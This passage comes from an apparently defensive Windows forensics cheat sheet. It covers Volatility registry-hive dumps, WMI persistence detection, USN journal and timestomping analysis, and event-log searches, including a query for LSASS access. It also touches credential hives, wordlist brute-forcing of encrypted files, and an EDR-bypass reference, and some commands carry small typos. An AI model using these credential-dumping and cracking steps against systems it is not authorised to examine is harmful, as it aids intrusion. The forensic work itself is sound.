```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem printkey -o 0xb50579ead000 -k 
deactivate
```

### dump Windows Registry Keys

#### via volatility2 / dumpregistry

```
# Read the registry using virtual addresses from hivelist obtained via printkey command
# vol -f test.raw windows.registry.printkey.PrintKey
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem dumpregistry-o 0xffffb50579ead000
deactivate
```
Taken from [here](https://medium.com/@0xcc00/bypassing-edr-ntds-dit-protection-using-blueteam-tools-1d161a554f9f)

#### via volatility2 / hivedump

```
# Read the registry using the virtual address from hivelist
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem hivedump -o 0xffffb50579ead000
deactivate
```

#### via volatility3 / hivelist

Filter using the output from `hivelist` command [here]([#via-volatility3--hivelist))

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.registry.hivelist.HiveList --filter "Work\ntuser.dat" --dump
deactivate
```

### Detect unusual WMI Event Consumers Activity

#### via Sysinternals / Autorunsc

```
C:\Users\azureuser\Desktop\opt\sysinternals
.\autorunsc64.exe -accepteula
```

#### via velociraptor / PermanentWMIEvents

Client Artifact to hunt in Velociraptor is `Windows.Persistence.PermanentWMIEvents`

#### via velociraptor / Autoruns

Client Artifact to hunt in Velociraptor is `Windows.SysInternals.Autoruns`

#### via Windows Event Logs / Sysmon / Event ID 19,20,21

```
Channel=Microsoft-Windows-Sysmon/Operational
EventID=19 (WmiEventFilter activity detected) OR 20 (WmiEventConsumer activity detected) OR 21 (WmiEventConsumerToFilter activity detected)
```

#### via wmi-parser / chainsaw

To detect [malicious event consumers](https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96), we can use `wmi-parser` to examine the current machine's WMI Event Consumers which could be both filtering and consuming WMI events (malicious indicators). The files are available in `C:\WINDOWS\system32\wbem\Repository\OBJECTS.DATA` OR `C:\WINDOWS\system32\wbem\Repository\FS\OBJECTS.DATA` folders.

```
.\wmi-parser.exe -i $PATH_TO_REPOSITORY\Repository\OBJECTS.DATA
```

If Sysmon is installed, then WMI Event Consumers will also appear in the sysmon logs in Event ID 19, 20, 21 as explained [here](https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96). These can be detected in Windows logs using `chainsaw`

```
.\chainsaw.exe search -t 'Event.System.EventID: =19' -t 'Event.System.Channel: Microsoft-Windows-Sysmon/Operational' C:\Windows\System32\winevt\Logs
# WmiEventConsumer - This will show the malicious code which executes when the WMI event is initiated
.\chainsaw.exe search -t 'Event.System.EventID: =20' -t 'Event.System.Channel: Microsoft-Windows-Sysmon/Operational' C:\Windows\System32\winevt\Logs
.\chainsaw.exe search -t 'Event.System.EventID: =21' -t 'Event.System.Channel: Microsoft-Windows-Sysmon/Operational' C:\Windows\System32\winevt\Logs
```

#### via WMIExplorer 

To detect malicious event consumers, we can leverage `WMIExplorer` GUI to examine the current machine's WMI Event Consumers and filters that are feeding the consumers to execute an action.

### Google Chrome Notifications

#### via strings

If Google Chrome is in use and Notifications are enabled for website, then historical notifications are usually available in the `%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Platform Notifications` as LevelDB Database. Extract the file and determine the clear-text notifications that a user may have received via `strings` or `xxd`. More info available [here](https://www.sans.org/blog/google-chrome-platform-notification-analysis/), [here](https://www.linkedin.com/pulse/investigating-abusive-push-notification-browsers-chrome-jimmy-remy/) and the structure of the LevelDB database is described [here](https://sansorg.egnyte.com/dl/QaoN3qdhig)

```
strings MANIFEST/*
strings *.ldb
```

### Get Boot sector information

#### via MFTECmd / $Boot
```
C:\Users\Administrator\Desktop\opt\EZTools\net6\MFTECmd.exe -f 'C:\Windows\Temp\C\$Boot' --csv C:\Windows\Temp --csvf Boot.csv
```

### Check created and deleted files 

#### via windows sysmon event ID 26 / windows sysmon event ID 23

```
EventID: 23
Channel: Microsoft-Windows-Sysmon/Operational
```

#### via Usn Journal ($J)

Extract the USN Journal which can contain useful information about created and deleted files as described [here](https://x.com/inversecos/status/1453588917337268233?s=20)
```
.\ExtractUsnJrnl64.exe /DevicePath:C: /OutputPath:C:\Windows\Temp
```

Parse the USN Journal for CSV output: 
```
.\UsnJrnl2Csv64.exe /UsnJrnlFile:C:\Windows\Temp\UsnJrnl_$J.bin
```

#### via Kape / MFTECmd / $J

Use Kape as described [here](#via-kroll-kape) to collect `$EXTEND\$J`
```
# Assumed that Kape used to obtain $Extend/$J (via SANS Triage)
C:\Users\Administrator\Desktop\opt\EZTools\net6\MFTECmd.exe -f "E:\C\$Extend\$J" --csv C:\Windows\Temp --csvf MFT-J.csv
```

#### via Kape / MFTEcmd / $Logfile

Use Kape as described [here](#via-kroll-kape) to collect `$LogFile`

As described [here](https://superuser.com/a/577272), the `$Logfile` is a special NTFS system file. It is a circular log of all disk operations and is used to roll back disk operations. 

```
# Assumed that Kape used to obtain $Extend/$J (via SANS Triage)
C:\Users\Administrator\Desktop\opt\EZTools\net6\MFTECmd.exe -f "E:\C\$LogFile" --csv C:\Windows\Temp --csvf Logfile.csv
```

For timestomping, look for criteria: 
```
Operation: CreateAttribute
Filename: file.txt (or your filename)
CurrentAttribute: $FILE_NAME 
```

Taken from [here](https://www.inversecos.com/2022/04/defence-evasion-technique-timestomping.html)

#### LogFileParser / $LogFile

```
# Use EZViewer to view the generate log file
cd C:\Users\Administrator\Desktop\opt\LogFileParser
.\LogFileParser64.exe /LogFileFile:'C:\Windows\Temp\C\$LogFile' /OutputPath:C:\Windows\Temp\ /Separator:","
```

#### via fsutil

```
fsutil usn readjournal c: csv > C:\Windows\Temp\usnjournal.csv
````

Taken from [here](https://www.reddit.com/r/screensharing/comments/k30iw0/how_to_dump_usn_journal_to_readable_format/)

### Windows Registry Paths

Following registries present in `C:\Windows\System32\config`:
- SAM
- SYSTEM
- SECURITY
- SOFTWARE
- DEFAULT
- COMPONENTS

Following registries are present in `C:\Users\$USERNAME`:
- NTUSER.DAT

Following registries are present in `C:\Users\$USERNAME\AppData\Local\Microsoft\Windows`:
- UsrClass.dat

### Export Registry to file

#### via RegRipper

Saves registry as .txt file

### Extract Deleted Registry Keys

#### via RegExplorer

Ensure that Options > Recover Deleted keys/values is selected

The deleted keys/values then appaar in the left-hand navigation pane as unassociated records

### Get Device timezone

#### via Registry / System

See `System/CurrentControlSet/Control/TimeZoneInformation`

### Build a wordlist for Extracting password encrypted files

#### via bulk_extractor

The command below will create a wordlist from disk data (can be offline images such as E01, .raw volatility images) which could be used for testing files that are encrypted
```
bulk_extractor -E wordlist -o /tmp/bulk_extractor $DISK_PATH
```
The above command creates a `wordlist_dedup_1.txt` which can be used for brute-forcing. More info is available [here](https://www.raedts.biz/forensics/building-wordlists-forensic-images/).

### Analyse the file contents in Recycle Bin

#### via RBCmd

```
# Get SID
wmic useraccount get name,sid
whoami /user

# Analyse all metadata $I files in the given Recycle bin subdirectory and store results
# $R with same following ID as $I has the contents
C:\Users\azureuser\Desktop\opt\EZTools\net6\RBCmd.exe -d C:\$Recycle.Bin\$SID\ --csv C:\Windows\Temp\out
```

https://www.precysec.com/post/how-to-recover-deleted-files-windows-recycle-bin-forensics

### Detect time the system was turned on / off (timeline)

#### via TurnedOnTimesView

Capture the `System.evtx` file from `C:\Windows\System32\winevt\Logs` from the disk and store it in a new folder. Launch Nirsoft's `TurnedOnTimesView` utility > Options > Advanced Options > Select `Data Source` as `External Disk` > Point to the folder where `System.evtx` is added.

The times for start-up and shutdown are displayed for the system. Select all entries and copy/paste them to an .xlsx file for analysis. 

More info is [here](https://www.raedts.biz/forensics/find-system-powered/)

### Searching Windows Logs

#### via powershell / Get-WinEvent

```
Get-ChildItem -Path . | Select-Object -ExpandProperty Name | %{ Get-WinEvent -Path $_ } | Where-Object { $ _.ID -eq "4799" }

# Detect Process Access Sysmon (Event ID 10) Logs where Lsass is accessed
$events = Get-WinEvent -Path .\LsassDump.evtx |Where-Object {$_.ID -eq 10}
$events |Where-Object {$_.Properties[8].Value -Like '*Lsass*'} |Format-List
```

#### via hayabusa

```
cd /opt/hayabusa
./hayabusa search -d /root/samples/winlogs --keyword ".ps1" --keyword "bat"
```

#### via chainsaw

See example [here](#via-wmi-parser--chainsaw)

#### via Eric Zimmerman's evtxecmd

See [EvtxEcmd](#via-eric-zimmermans-evtxecmd)

### Mount volume shadow copies for analysis

#### via Eric Zimmerman's VSCMount.exe

```
# Simply delete C:\VssRoot folder, when analysis is complete
cd C:\Users\azureuser\Desktop\opt\EZTools\net6
VSCMount.exe --dl C --mp C:\VssRoot --debug
```

## Eradication

## Recovery

### Check which application opens which file extensions in Windows

#### via powershell / Registry 

https://gist.github.com/MHaggis/a5b0af617ae62ded5a2ec4f15a96f4ac

### Detection for unusual hostnames connecting to systems

- Look for authentication attempts from hostnames (e.g. `DESKTOP-XXX`) OR IP addresses if your company follows the naming convention for hostnames (including in any VPN logs) eg [here](`https://www.linkedin.com/posts/stephan-berger-59575a20a_another-fun-one-the-user-runs-an-installer-activity-7225755841981755392-CnlB/?

#### via VPN logs

Custom VPN logs if logged centrally can capture hostnames. See Stephan-berger's post above

#### via Windows Event Logs / Event ID 4778

See [RDP Auth section](#via-windows-event-log--4778) above

#### via Windows Event Logs / Sysmon Event ID 24

```
# ClientInfo field contains the remote hostname field from which connection was initiated
EventID: 24 (Clipboard Changed)
Channel: Microsoft-Windows-Sysmon/Operational
```
